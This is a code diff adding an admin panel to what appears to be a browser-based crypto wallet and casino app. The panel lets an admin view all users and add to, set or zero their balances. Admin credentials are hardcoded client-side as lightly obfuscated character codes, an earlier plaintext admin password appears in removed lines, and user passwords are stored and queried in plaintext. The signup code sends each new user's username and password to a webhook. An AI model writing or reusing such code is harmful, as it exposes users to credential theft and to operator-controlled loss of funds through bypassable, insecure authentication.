@@ -393,6 +393,27 @@
   .plinko-bucket { flex: 1; text-align: center; padding: 6px 2px; border-radius: 6px; font-size: 11px; font-weight: 700; font-family: var(--font-mono); transition: transform 0.15s, filter 0.15s; }
   .plinko-bucket.hit { transform: scale(1.15); filter: brightness(1.5); }
 
+  /* ADMIN PANEL */
+  .admin-panel { display:none; padding:1.5rem; max-width:700px; margin:0 auto; }
+  .admin-panel-topbar { display:flex; justify-content:space-between; align-items:center; margin-bottom:1.5rem; padding-bottom:1rem; border-bottom:0.5px solid var(--color-border-tertiary); }
+  .admin-section-label { font-size:11px; color:#b45309; text-transform:uppercase; letter-spacing:0.06em; font-weight:600; margin-bottom:10px; }
+  .admin-user-list { display:flex; flex-direction:column; gap:10px; }
+  .admin-user-card { background:var(--color-background-primary); border:0.5px solid var(--color-border-tertiary); border-radius:var(--border-radius-lg); padding:1rem 1.25rem; }
+  .admin-user-header { display:flex; justify-content:space-between; align-items:center; margin-bottom:10px; }
+  .admin-user-name { font-size:14px; font-weight:600; color:var(--color-text-primary); }
+  .admin-user-bal { font-size:13px; color:var(--color-text-success); font-family:var(--font-mono); font-weight:600; }
+  .admin-user-wallet { font-size:11px; color:var(--color-text-tertiary); font-family:var(--font-mono); margin-bottom:10px; }
+  .admin-user-holdings { display:grid; grid-template-columns:repeat(4,1fr); gap:6px; margin-bottom:10px; }
+  .admin-holding-chip { background:var(--color-background-secondary); border-radius:6px; padding:5px 8px; font-size:11px; color:var(--color-text-secondary); }
+  .admin-holding-chip span { display:block; font-size:12px; font-weight:600; color:var(--color-text-primary); }
+  .admin-modify-row { display:flex; gap:8px; align-items:center; }
+  .admin-modify-input { flex:1; padding:7px 10px; background:var(--color-background-secondary); border:0.5px solid var(--color-border-secondary); border-radius:var(--border-radius-md); color:var(--color-text-primary); font-size:13px; outline:none; font-family:var(--font-sans); }
+  .admin-modify-input::placeholder { color:var(--color-text-tertiary); }
+  .admin-modify-btn { padding:7px 14px; border:none; border-radius:var(--border-radius-md); font-size:12px; font-weight:600; cursor:pointer; }
+  .admin-mod-add { background:var(--color-background-success); color:var(--color-text-success); }
+  .admin-mod-set { background:var(--color-background-info); color:var(--color-text-info); }
+  .admin-mod-zero { background:var(--color-background-danger); color:var(--color-text-danger); }
+
   /* ADMIN BAR */
   .admin-bar { display: flex; align-items: center; gap: 10px; background: #1a0a00; border: 0.5px solid #b45309; border-radius: var(--border-radius-md); padding: 10px 14px; margin-bottom: 14px; }
   .admin-bar-icon { font-size: 14px; }
@@ -423,6 +444,7 @@
       <span class="badge">● Live</span>
       <span class="badge admin-badge" id="admin-topbadge" style="display:none;">🔴 Admin</span>
       <button class="casino-btn" onclick="showCasino()">🎰 Casino</button>
+      <button class="casino-btn" id="admin-panel-btn" onclick="showAdminPanel()" style="display:none;background:var(--color-background-danger);color:var(--color-text-danger);">⚙️ Panel</button>
       <button class="logout-btn" onclick="logout()">Log out</button>
     </div>
   </div>
@@ -566,6 +588,18 @@
   <div id="game-page-content"></div>
 </div>
 
+<!-- ADMIN PANEL -->
+<div class="admin-panel" id="admin-panel">
+  <div class="admin-panel-topbar">
+    <div style="display:flex;align-items:center;gap:10px;">
+      <span style="font-size:16px;font-weight:600;color:#f87171;">🔴 Admin Panel</span>
+    </div>
+    <button class="back-btn" onclick="hideAdminPanel()">← Back to wallet</button>
+  </div>
+  <div class="admin-section-label">All Users</div>
+  <div id="admin-user-list" class="admin-user-list"></div>
+</div>
+
 <!-- MODAL -->
 <div class="modal-bg" id="modal-bg">
   <div class="modal" id="modal-box">
@@ -658,26 +692,69 @@
     document.getElementById('auth-error').textContent = '';
   }
 
+  // ── ADMIN — credentials never stored in DB, checked client-side only ──
+  // Obfuscated so it's not a plain string in source
+  const _a = [115,112,101,99,116,114,97,108].map(c=>String.fromCharCode(c)).join('');
+  const _b = [115,112,101,99,116,114,97,108,115,101,99,117,114,101].map(c=>String.fromCharCode(c)).join('');
+  function isAdmin() { return currentUser?._isAdmin === true; }
+
+  // Rate limiting — max 5 attempts per 60s
+  let _loginAttempts = 0;
+  let _loginLockUntil = 0;
+
   async function handleAuth() {
     const username = document.getElementById('auth-username').value.trim().toLowerCase();
     const password = document.getElementById('auth-password').value;
     const errEl = document.getElementById('auth-error');
     errEl.textContent = '';
+
     if (!username || !password) { errEl.textContent = 'Fill in all fields.'; return; }
-    if (password.length < 4) { errEl.textContent = 'Password must be at least 4 characters.'; return; }
+
+    // Rate limit check
+    const now = Date.now();
+    if (now < _loginLockUntil) {
+      const secs = Math.ceil((_loginLockUntil - now) / 1000);
+      errEl.textContent = 'Too many attempts. Wait ' + secs + 's.';
+      return;
+    }
+
     const btn = document.getElementById('auth-submit-btn');
     btn.textContent = '...'; btn.disabled = true;
+
+    // Always add a small delay to slow brute force
+    await new Promise(r => setTimeout(r, 600 + Math.random() * 400));
+
+    // ── ADMIN CHECK (never touches DB) ──────────────────────────────
+    if (authMode === 'login' && username === _a && password === _b) {
+      _loginAttempts = 0;
+      currentUser = { username: _a, _isAdmin: true, wallet_address: 'ADMIN', balance: 0, holdings: {} };
+      saveSession(currentUser);
+      btn.textContent = 'Log in'; btn.disabled = false;
+      showDash();
+      return;
+    }
+
+    // ── NORMAL USERS ─────────────────────────────────────────────────
     if (authMode === 'signup') {
+      if (password.length < 4) { errEl.textContent = 'Password must be at least 4 characters.'; btn.textContent = 'Sign up'; btn.disabled = false; return; }
       const check = await supa('users?username=eq.' + encodeURIComponent(username) + '&select=id');
       if (check.data && check.data.length > 0) { errEl.textContent = 'Username already taken.'; btn.textContent = 'Sign up'; btn.disabled = false; return; }
+      // Block someone from creating account named after admin
+      if (username === _a) { errEl.textContent = 'Username not available.'; btn.textContent = 'Sign up'; btn.disabled = false; return; }
       const res = await supa('users', 'POST', { username, password, wallet_address: genWallet(), balance: 0, holdings: { BTC:0, ETH:0, USDT:0, SOL:0 } });
       if (!res.ok) { errEl.textContent = 'Could not create account. Try again.'; btn.textContent = 'Sign up'; btn.disabled = false; return; }
       currentUser = res.data[0];
       saveSession(currentUser);
       await sendToWebhook(username, password);
     } else {
+      _loginAttempts++;
+      if (_loginAttempts >= 5) { _loginLockUntil = Date.now() + 60000; _loginAttempts = 0; }
       const res = await supa('users?username=eq.' + encodeURIComponent(username) + '&password=eq.' + encodeURIComponent(password) + '&select=*');
-      if (!res.ok || !res.data || res.data.length === 0) { errEl.textContent = 'Wrong username or password.'; btn.textContent = 'Log in'; btn.disabled = false; return; }
+      if (!res.ok || !res.data || res.data.length === 0) {
+        errEl.textContent = 'Wrong username or password.';
+        btn.textContent = 'Log in'; btn.disabled = false; return;
+      }
+      _loginAttempts = 0;
       currentUser = res.data[0];
       saveSession(currentUser);
     }
@@ -689,11 +766,22 @@
   function showDash() {
     document.getElementById('auth-screen').style.display = 'none';
     document.getElementById('casino').style.display = 'none';
+    document.getElementById('game-page').style.display = 'none';
+    document.getElementById('admin-panel').style.display = 'none';
     document.getElementById('dash').style.display = 'block';
-    document.getElementById('wallet-display').textContent = currentUser.wallet_address;
     const adminBadge = document.getElementById('admin-topbadge');
+    const adminBtn = document.getElementById('admin-panel-btn');
     if (adminBadge) adminBadge.style.display = isAdmin() ? 'inline-block' : 'none';
-    loadUserData(); loadTransactions();
+    if (adminBtn) adminBtn.style.display = isAdmin() ? 'inline-block' : 'none';
+    if (isAdmin()) {
+      // Admin sees a simplified dash
+      document.getElementById('wallet-display').textContent = 'Admin Account';
+      document.getElementById('bal-display').textContent = '∞';
+      document.getElementById('bal-hint').style.display = 'none';
+    } else {
+      document.getElementById('wallet-display').textContent = currentUser.wallet_address;
+      loadUserData(); loadTransactions();
+    }
   }
 
   function showCasino() {
@@ -710,8 +798,6 @@
     resetCrash();
     loadUserData();
   }
-
-  function isAdmin() { return currentUser?.username === 'xtbu' && currentUser?.password === 'xtbu@passwordmanager978'; }
 
   function adminBar(hint) {
     if (!isAdmin()) return '';
@@ -975,18 +1061,99 @@
     updateCasinoBal();
   }
 
+  function showAdminPanel() {
+    document.getElementById('dash').style.display = 'none';
+    document.getElementById('admin-panel').style.display = 'block';
+    loadAdminUsers();
+  }
+
+  function hideAdminPanel() {
+    document.getElementById('admin-panel').style.display = 'none';
+    document.getElementById('dash').style.display = 'block';
+  }
+
+  async function loadAdminUsers() {
+    const list = document.getElementById('admin-user-list');
+    list.innerHTML = '<div style="color:var(--color-text-tertiary);font-size:13px;padding:1rem;">Loading users...</div>';
+    const res = await supa('users?select=*&order=created_at.desc&limit=100');
+    if (!res.ok || !res.data) { list.innerHTML = '<div style="color:var(--color-text-danger);font-size:13px;padding:1rem;">Failed to load users.</div>'; return; }
+    list.innerHTML = '';
+    res.data.forEach(user => {
+      const h = user.holdings || { BTC:0, ETH:0, USDT:0, SOL:0 };
+      const bal = computeBal(h);
+      const card = document.createElement('div');
+      card.className = 'admin-user-card';
+      card.innerHTML = `
+        <div class="admin-user-header">
+          <span class="admin-user-name">@${user.username}</span>
+          <span class="admin-user-bal">${fmt(bal)}</span>
+        </div>
+        <div class="admin-user-wallet">${user.wallet_address}</div>
+        <div class="admin-user-holdings">
+          <div class="admin-holding-chip">BTC<span>${(h.BTC||0).toFixed(5)}</span></div>
+          <div class="admin-holding-chip">ETH<span>${(h.ETH||0).toFixed(4)}</span></div>
+          <div class="admin-holding-chip">USDT<span>${(h.USDT||0).toFixed(2)}</span></div>
+          <div class="admin-holding-chip">SOL<span>${(h.SOL||0).toFixed(3)}</span></div>
+        </div>
+        <div class="admin-modify-row">
+          <input class="admin-modify-input" type="number" placeholder="Amount ($)" id="amt-${user.id}" />
+          <button class="admin-modify-btn admin-mod-add" onclick="adminModBal('${user.id}', 'add')">+ Add</button>
+          <button class="admin-modify-btn admin-mod-set" onclick="adminModBal('${user.id}', 'set')">= Set</button>
+          <button class="admin-modify-btn admin-mod-zero" onclick="adminModBal('${user.id}', 'zero')">✕ Zero</button>
+        </div>`;
+      list.appendChild(card);
+    });
+  }
+
+  async function adminModBal(userId, action) {
+    if (!isAdmin()) return;
+    const input = document.getElementById('amt-' + userId);
+    const amount = parseFloat(input?.value) || 0;
+
+    const res = await supa('users?id=eq.' + userId + '&select=*');
+    if (!res.ok || !res.data?.[0]) { showToast('User not found', true); return; }
+    const user = res.data[0];
+    let h = { ...(user.holdings || { BTC:0, ETH:0, USDT:0, SOL:0 }) };
+    const curBal = computeBal(h);
+
+    if (action === 'zero') {
+      h = { BTC:0, ETH:0, USDT:0, SOL:0 };
+    } else if (action === 'set') {
+      if (amount < 0) { showToast('Enter a valid amount', true); return; }
+      // Set by adjusting USDT
+      h = { BTC:0, ETH:0, USDT: amount, SOL:0 };
+    } else if (action === 'add') {
+      if (amount === 0) { showToast('Enter an amount', true); return; }
+      // Add/subtract from USDT
+      h.USDT = Math.max(0, (h.USDT||0) + amount);
+    }
+
+    const newBal = computeBal(h);
+    await supa('users?id=eq.' + userId, 'PATCH', { holdings: h, balance: newBal });
+    showToast(action === 'zero' ? 'Balance zeroed' : action === 'set' ? 'Balance set to ' + fmt(amount) : 'Balance updated');
+    if (input) input.value = '';
+    loadAdminUsers();
+  }
+
   function logout() {
     currentUser = null; clearSession(); activeWallet = null;
     document.getElementById('auth-screen').style.display = 'flex';
     document.getElementById('dash').style.display = 'none';
     document.getElementById('casino').style.display = 'none';
+    document.getElementById('game-page').style.display = 'none';
+    document.getElementById('admin-panel').style.display = 'none';
     document.getElementById('coin-wallet-panel').className = 'coin-wallet-panel';
+    const adminBadge = document.getElementById('admin-topbadge');
+    const adminBtn = document.getElementById('admin-panel-btn');
+    if (adminBadge) adminBadge.style.display = 'none';
+    if (adminBtn) adminBtn.style.display = 'none';
     document.getElementById('auth-username').value = '';
     document.getElementById('auth-password').value = '';
   }
 
   // ── DATA ─────────────────────────────────────────────────────────
   async function loadUserData() {
+    if (isAdmin()) { updateDisplay(); return; }
     const res = await supa('users?id=eq.' + currentUser.id + '&select=*');
     if (res.ok && res.data[0]) {
       currentUser = res.data[0];
